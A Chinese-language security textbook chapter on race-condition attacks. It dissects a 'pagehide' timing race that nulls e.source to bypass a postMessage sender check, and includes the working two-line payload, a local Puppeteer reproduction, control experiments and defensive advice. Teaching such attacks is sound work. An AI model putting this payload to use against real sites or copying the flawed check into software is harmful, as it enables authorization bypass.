# 12 竞态攻击与时序

> **本章一句话**：当一段安全校验里的"两个值"是在**不同时刻**取得的，攻击者就可以操纵"这两个时刻之间发生的事"让校验结果反转——这就是竞态攻击。全书的核心攻击（pagehide 竞态）就是它的一个实例。

## 12.1 竞态是什么

先看一个生活场景：门卫核对来访者，手里有两样东西——

- 信件上的"寄件人"栏（**寄出那一刻**定格；若信送达时寄件人已不存在，这封信就是"无寄件人"）；
- 前台"自己人名单"（**每次核对时**现场查询，随时更新）。

平时两者对得上，检查结果正常。但如果**从寄出到核对之间，寄件人被注销了**，这封信就会被当成外人的信——校验结果反转。

技术定义：**竞态（race condition）指系统行为依赖"两个事件的相对顺序"，而攻击者能影响这个顺序**。在 Web 安全里最常见的形态就是"异步比较竞态"：

> 一段校验代码里参与比较的两个值，一个在**T1 时刻**定格，另一个在**T2 时刻**现场取值；攻击者设法在 T1 与 T2 之间制造一个变化，让比较结果翻转。

与"逻辑漏洞"的区别：**竞态里的代码逻辑没有写错**。错的是它的隐含假设——"从我取值开始，到另一个值被取到为止，中间什么都没发生"。攻击者要做的就是让"中间发生点什么"。

## 12.2 求值时刻表：分析竞态的通用工具

看到任何"校验/比较"代码，**先别分析怎么绕过，先画一张表**，回答三个问题：

1. 每个参与比较的值，**什么时候取**？
2. 每个值，**什么时候用**？
3. **这两个时刻之间，可能发生什么事件**？

拿本例的防线画出来（第三列是灵魂）：

| 代码里的值 | 什么时候取 | 两时刻之间可能发生的事件 |
|-----------|-----------|------------------------|
| `e.source`（消息的寄件人） | 消息**寄出那一刻**指向寄件窗口；**投递时若源文档已销毁，它为 `null`** | （1）iframe 里的文档被换掉 |
| `viewer.contentWindow`（iframe 当前窗口） | 每次**处理消息时**现场重读（稳定的窗口引用，指向当前文档） | （2）iframe 被从页面里删掉 |
| `closing`（开关） | viewer 加载完成时置 true（时间点绑定） | （3）窗口被关闭 |

第三列一旦填出来，"文档被换掉"就白纸黑字躺在那里，下一个问题自然浮现：**"有没有一条消息恰好跨越'换文档'的时刻？"**——这个问题直接通向答案。填法：把"这个页面/元素可能经历的所有事件"过一遍（加载、换文档、被移除、窗口关闭），每个都问一句"它会改变比较的某一边吗？"

## 12.3 消息的排队机制：竞态的土壤

要理解"跨越"为什么可能，先理解浏览器的**事件队列**：消息不是"寄到就立刻被读"，而是先入队、等浏览器处理完手头的事情再按顺序处理。

银行类比：你到银行（接收页面）办业务，不是一到柜台就办——先从取号机拿号（`postMessage`），然后坐等叫号（任务队列排队）；柜员（浏览器事件处理）手头有别的业务（渲染、加载新文档）会先忙完才轮到你。

**关键含义**：从"拿号"到"叫你"之间存在时间差——**竞态就藏在这段时间里**。如果叫号时，取号人已经不存在了（记录失效），而柜员手边的名单永远只认"当前在场的人"——对不上，这单就被当成外人的业务。

## 12.4 pagehide 竞态完整解剖

防线代码（审查页的消息监听器）：

```javascript
window.addEventListener("message", (e) => {
  if (!closing || e.source === viewer.contentWindow) return;   // 寄件人是"自家人"→拒收
  fetch("/complete", { ... });                                  // 否则：替寄件人发批准
});
```

正常时序下没有漏洞：沙箱里的脚本只要发消息，`e.source` 和 `contentWindow` 都指向同一个窗口，必被拒收。**而审查页自己提供了一个"换文档"的动作**：

```javascript
viewer.addEventListener("load", () => {
  if (closing) return;
  closing = true;                       // （1）解锁
  viewer.src = "/sandbox?rid=...&end";  // （2）把 viewer 换成空白文档 → 文档切换！
});
```

于是完整攻击时序如下：

```text
━━━━━━ 方式一：页面存活期间高频发消息（失败）━━━━━━

  旧文档(S2)存活期间
  ├─ t1: postMessage → 入队 → 立刻处理
  │        e.source=【当前窗口】 contentWindow=【当前窗口】 → 相等 → 被过滤
  ├─ t2: postMessage → 同上 → 被过滤
  ▼
  文档切换（旧文档销毁，空白文档装载）
  ▼
  新文档期间：S2 已经死了，再也没有消息发出
  → 所有消息都在"旧文档存活期"内处理完毕，一次都没能跨过切换点

━━━━━━ 方式二：pagehide 时刻发（成功）━━━━━━

  ├─ viewer 加载完成 → closing=true → viewer.src=end 被赋值
  ▼
  浏览器开始切换文档：
  ├─ 旧文档收到 pagehide 事件（它还活着，但马上要死）
  │    └─ S2 的 pagehide 监听器触发：
  │         top.postMessage(...)  ← 此刻发出！（消息进入任务队列排队）
  ├─ 旧文档销毁
  ├─ 新文档装载完成
  ▼
  消息被处理（此时源文档已销毁）：
       e.source=null（"无寄件人"）
       viewer.contentWindow=【新文档窗口（现场读取）】
       → null 不等于任何窗口引用 → 比较为 false → 不 return → 批准被放行 ✅
```

**为什么必须是 `pagehide`**（同类生命周期钩子的对比）：

| 钩子 | 结论 |
|------|------|
| `unload` | 老一代同用途事件，已被 Chrome 废弃，写了也不执行 |
| `beforeunload` | 会弹出"确定离开吗？"对话框等用户点击；无头浏览器没人能点，页面卡死，不可靠 |
| **`pagehide`** | **静默**（不弹框）、**可靠**（一定执行），且执行时机恰好落在"消息寄出后排队中、新文档还没就位"的窗口内——三个性质缺一不可 |

最终 payload 只有两行：

```javascript
addEventListener("pagehide", function () {
  try { top.postMessage({ p: 1 }, "*"); top.postMessage({ p: 2 }, "*"); } catch (e) {}
});
```

它不需要知道任何暗号、不需要任何权限，甚至不需要关心 `closing` 开关：`pagehide` 由"viewer 加载完成、开始换页"触发，而 `closing=true` 也恰好是同一个 load 事件设置的——**时序天然对齐**。连发两条消息是冗余保险（防竞态偶尔漏一条）。

> 机制要点：`viewer.contentWindow` 是稳定的窗口引用（WindowProxy），导航后指向新文档；而 `e.source` 的取值规则是——**消息投递时源文档若已销毁，则为 `null`**。`null` 不等于任何窗口引用，比较必然翻转。这与 7.5 的 `e.source = null` 技巧是**同一个原理**："让源文档在消息被处理前销毁"。在 12.5 的实验里加一行探针（打印 `e.source === null`）即可亲眼确认。

## 12.5 可复现实验（不依赖目标系统，60 行最小环境）

自己扮演"服务器"和"访问者"，把"防线 + 沙箱 + pagehide"逐字复刻：

```javascript
// pagehide_race_demo.js  运行: node pagehide_race_demo.js   前置: npm install puppeteer
const http = require("node:http");
const puppeteer = require("puppeteer");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const PORT = 9974;
const CSP = "sandbox allow-scripts; default-src 'none'; script-src 'nonce-tn'; " +
            "require-trusted-types-for 'script'; trusted-types 'none'; frame-ancestors 'self'";

http.createServer((req, res) => {
  const u = new URL(req.url, "http://x");

  // /host = 复刻审查页（防线逐字照抄，只加了打印）
  if (u.pathname === "/host") {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(`<!doctype html><body>REVIEW-复刻
      <iframe id="viewer" sandbox="allow-scripts" src="/sbx"></iframe>
      <script>
        const viewer = document.getElementById("viewer");
        let closing = false;
        addEventListener("message", (e) => {
          const eq = (e.source === viewer.contentWindow);
          console.log("MSG: closing=" + closing + " eq=" + eq + " data=" + JSON.stringify(e.data));
          if (!closing || eq) return;
          console.log("!!!!!! PASSED FILTER !!!!!! → 此处即发批准请求");
        });
        viewer.addEventListener("load", () => {
          if (closing) return;
          closing = true;
          viewer.src = "/sbx?end";     // 触发文档切换
        });
      </scr` + `ipt></body>`);
    return;
  }

  // /sbx = 复刻沙箱页（攻击载荷装在这里）
  if (u.pathname === "/sbx") {
    if (u.searchParams.has("end")) {
      // 空白文档：故意延迟 300ms 响应，把"切换窗口"拉长到肉眼可见
      setTimeout(() => {
        res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
        res.end("<!doctype html>");
      }, 300);
      return;
    }
    res.writeHead(200, { "Content-Type": "text/html", "Content-Security-Policy": CSP });
    res.end(`<!doctype html><body><script nonce="tn">
      console.log("[S2] alive, origin=" + window.origin);   // 预期打印 null（无国籍）
      addEventListener("pagehide", function () {
        console.log("[S2] pagehide! sending top.postMessage NOW");
        top.postMessage({ pagehideMsg: 1 }, "*");
        top.postMessage({ pagehideMsg: 2 }, "*");
      });
    </scr` + `ipt></body>`);
    return;
  }
  res.writeHead(404); res.end();
}).listen(PORT, async () => {
  const browser = await puppeteer.launch({ headless: "new", args: ["--no-sandbox"] });
  const p = await browser.newPage();
  p.on("console", (m) => console.log("[chrome]", m.text()));
  await p.goto(`http://localhost:${PORT}/host`, { waitUntil: "domcontentloaded" });
  await sleep(4000);
  await browser.close(); process.exit(0);
});
```

预期输出与解读：

```text
[chrome] [S2] alive, origin=null                                    ← 沙箱没收身份证，脚本照跑
[chrome] [S2] pagehide! sending top.postMessage NOW                 ← 换页前最后一瞬发信
[chrome] MSG: closing=true eq=false data={"pagehideMsg":1}          ← 核心：比较翻转！
[chrome] !!!!!! PASSED FILTER !!!!!! → 此处即发批准请求             ← 防线被绕过
[chrome] MSG: closing=true eq=false data={"pagehideMsg":2}          ← 第二封同样通过（连发两条是冗余保险）
```

**对照实验（亲手复现"为什么一批同质实验会集体漏掉它"）**：把 S2 里 pagehide 那段换成

```javascript
setInterval(function () { top.postMessage({ intervalMsg: 1 }, "*"); }, 1);
```

重跑会看到**所有**消息都是 `eq=true`、没有一条 PASSED——因为"存活期发消息"这一种时序里，从寄出到处理之间什么都没发生。两组输出放在一起看：**唯一差异就是"寄出与被处理之间有没有发生文档切换"**。

## 12.6 分析方法教训：为什么"同质实验"会集体踩空

这段竞态的实战教训同样值得沉淀，因为它是一类**通用的分析陷阱**：

**表象：实验数量很多，但共享同一个隐含假设。** 大量失败实验全都在"消息在旧文档存活期内发出并立即处理"这一种时序里打转——**只变化了"谁发"这一个维度，从未变化过"何时发"这个正交维度**。数量给的是虚假的自信：N 次一致的失败只能证明"这一种做法不行"，证明不了"都不行"。

**三个放大陷阱**（AI 分析者也常踩）：上下文里一旦写入"此路死锁"的结论，之后每次推理都被它锚定；知识跟着上下文词汇走——"pagehide"这个词从未出现，相关知识就从未被激活（不是不知道，是"想不起来自己知道"）；"跑实验几秒出结果"的进展感会挤压"停下来画表"的思考时间。

三条可操作的对策：

| 对策 | 做法 |
|------|------|
| **对照组规则** | 任何要得出"此路不通"的实验，必须包含至少一个**换了角度**的对照组（正确设计：存活期发 / 濒死期发 / 什么都不发，三组并排跑） |
| **否定结论写全三段** | "在【什么条件】下不行（哪个实验验证的）+ 还没试过：【什么条件】"。把"还没试过"写成清单——它就是下一步实验的待办 |
| **换词检索** | 卡住后禁止再用当前问题的词汇搜索；把问题拆成"对象 / 时机 / 机制"三类词分别造词、跨类组合（本例的命中组合是 `postMessage + pagehide`：一个对象词 + 一个时机词） |

## 12.7 防御与设计启示

| 启示 | 说明 |
|------|------|
| **别用窗口身份比较做授权** | `e.source === viewer.contentWindow` 这种校验天然是"两个时刻的值"，会被文档切换击穿。正确做法：校验 `e.origin`（网站身份，不随文档切换变）+ 消息体携带服务端生成的一次性令牌 |
| **别把"客户端事件顺序"当授权依据** | 本例的服务端把"review 页面发来批准请求"当成授权信号，而"review 何时发"可以完全被攻击者操纵。任何依赖客户端事件先后顺序的决策，最终都要面对竞态 |
| **点对点通信用 `MessageChannel`** | 通道显式建立、双方绑定，不依赖"谁的窗口引用"（07 章） |
| **一次性凭据"消费即失效"** | 暗号（nonce）用过一次立即作废，可以切断"历史回放"（11 章）与重复提交 |
| **纵深防御的边界要认清** | 本例的沙箱、COOP、CSP 都工作正常且强度足够；防线倒在"组件之间没人看守的缝"——**单个组件都安全，组件之间的事件顺序成了新的攻击面** |

## 12.8 易混点

| 混淆 | 正解 |
|------|------|
| "竞态 = 偶发 bug / 概率问题" | 在攻击语境里它是**被主动操纵的确定性时序**：攻击者通过 pagehide 等钩子把"偶发"变成必然 |
| "代码逻辑没错 = 没有漏洞" | 竞态的漏洞在"时序假设"里：假设中间什么都没发生 |
| "pagehide 是废弃的老 API" | 它是浏览器官方生命周期事件，是"文档确定要销毁前的最后通知"，本竞态就是靠它 |
| "消息发出去了 = 对方会按发出时的状态处理" | 消息要排队，处理时按**处理时刻**的状态看世界 |
